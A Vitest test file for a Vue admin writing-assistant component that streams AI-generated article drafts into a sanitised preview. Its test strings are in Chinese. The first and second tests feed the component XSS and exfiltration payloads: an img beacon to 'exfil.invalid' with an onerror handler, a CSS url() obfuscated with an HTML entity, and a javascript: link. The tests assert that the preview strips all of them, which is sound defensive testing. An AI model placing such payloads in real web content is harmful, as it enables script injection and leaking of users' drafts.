import { flushPromises, mount } from '@vue/test-utils'
import { beforeEach, expect, it, vi } from 'vitest'
import AdminWritingAssistant from '@/components/AdminWritingAssistant.vue'

const stream = vi.hoisted(() => vi.fn())
vi.mock('@/services/adminAgent', () => ({ AdminAgentService: { stream } }))
beforeEach(() => { stream.mockReset() })

it('页面流式过程只展示预览，完整成功后点击应用才一次回写', async () => {
  let handlers: any
  let finish!: () => void
  stream.mockImplementation(async (_request, callbacks) => {
    handlers = callbacks
    await new Promise<void>(resolve => { finish = resolve })
  })
  const draft = { postId: 1, title: '原始标题', content: '<p>原稿尾部</p>' }
  const wrapper = mount(AdminWritingAssistant, { props: { draft } })
  await wrapper.find('textarea').setValue('写一篇完整文章')
  await wrapper.find('.send-btn').trigger('click')
  handlers.onFieldUpdate({ title: '新标题', contentHtml: '<p>中间稿</p>' })
  handlers.onFieldUpdate({ contentHtml: '<p style="background-image:&#117;rl(https://exfil.invalid/style)">完整结果</p><img src="https://exfil.invalid/image?draft=secret" onerror="alert(1)">' })
  await flushPromises()
  expect(wrapper.emitted('fieldUpdate')).toBeUndefined()
  expect(wrapper.find('.writing-preview-body').html()).not.toContain('onerror')
  expect(wrapper.find('.writing-preview-body').find('img').exists()).toBe(false)
  expect(wrapper.find('.writing-preview-body').html()).not.toContain('exfil.invalid')
  expect(wrapper.find('.writing-preview button').attributes('disabled')).toBeDefined()
  handlers.onComplete({}); finish(); await flushPromises()
  await wrapper.find('.writing-preview button').trigger('click')
  expect(wrapper.emitted('fieldUpdate')).toHaveLength(1)
  expect(wrapper.emitted('fieldUpdate')?.[0]?.[0]).toMatchObject({ title: '新标题', contentHtml: expect.stringContaining('完整结果') })
  expect(wrapper.emitted('fieldUpdate')?.[0]?.[1]).toEqual(draft)
  wrapper.unmount()
})

it('预览链接没有活动href，只有用户点击才打开已净化的地址', async () => {
  stream.mockImplementation(async (_request, handlers) => {
    handlers.onFieldUpdate({ contentHtml: '<p><a href="https://reference.invalid/article">参考</a></p><a href="javascript:alert(1)">无效链接</a>' })
    handlers.onComplete({})
  })
  const open = vi.spyOn(window, 'open').mockImplementation(() => null)
  const wrapper = mount(AdminWritingAssistant, { props: { draft: { content: '<p>原稿</p>' } } })
  await wrapper.find('textarea').setValue('润色正文')
  await wrapper.find('.send-btn').trigger('click'); await flushPromises()
  const link = wrapper.find('.writing-preview-body a')
  expect(link.attributes('href')).toBeUndefined()
  expect(open).not.toHaveBeenCalled()
  await link.trigger('click')
  expect(open).toHaveBeenCalledWith('https://reference.invalid/article', '_blank', 'noopener,noreferrer')
  expect(wrapper.find('.writing-preview-body').html()).not.toContain('javascript:')
  wrapper.unmount()
})

it('媒体预览隐藏后仍明确提示本轮省略的原稿媒体数量', async () => {
  stream.mockImplementation(async (_request, handlers) => {
    handlers.onFieldUpdate({ contentHtml: '<p>润色稿省略媒体</p>' })
    handlers.onComplete({})
  })
  const wrapper = mount(AdminWritingAssistant, { props: { draft: {
    content: '<p>原稿</p><audio src="/uploads/a.mp3"></audio><img src="/uploads/a.png">'
  } } })
  await wrapper.find('textarea').setValue('润色正文')
  await wrapper.find('.send-btn').trigger('click'); await flushPromises()
  expect(wrapper.find('.writing-preview').text()).toContain('本轮将移除 2 处原稿媒体')
  wrapper.unmount()
})

it('停止生成和卸载把AbortSignal传给流客户端，部分结果不可应用', async () => {
  const signals: AbortSignal[] = []
  stream.mockImplementation(async (_request, handlers, signal) => {
    signals.push(signal)
    handlers.onFieldUpdate({ contentHtml: '<p>部分结果</p>' })
    await new Promise<void>((_resolve, reject) => signal.addEventListener('abort', () => reject(new DOMException('Aborted', 'AbortError'))))
  })
  const wrapper = mount(AdminWritingAssistant, { props: { draft: { content: '<p>原稿</p>' } } })
  await wrapper.find('textarea').setValue('润色正文')
  await wrapper.find('.send-btn').trigger('click')
  await wrapper.findAll('button').find(button => button.text() === '停止生成')!.trigger('click')
  await flushPromises()
  expect(signals[0]?.aborted).toBe(true)
  expect(wrapper.find('.writing-preview button').attributes('disabled')).toBeDefined()
  expect(wrapper.emitted('fieldUpdate')).toBeUndefined()
  await wrapper.find('textarea').setValue('润色正文')
  await wrapper.find('.send-btn').trigger('click')
  wrapper.unmount(); await flushPromises()
  expect(signals[1]?.aborted).toBe(true)
  expect(wrapper.emitted('fieldUpdate')).toBeUndefined()
})
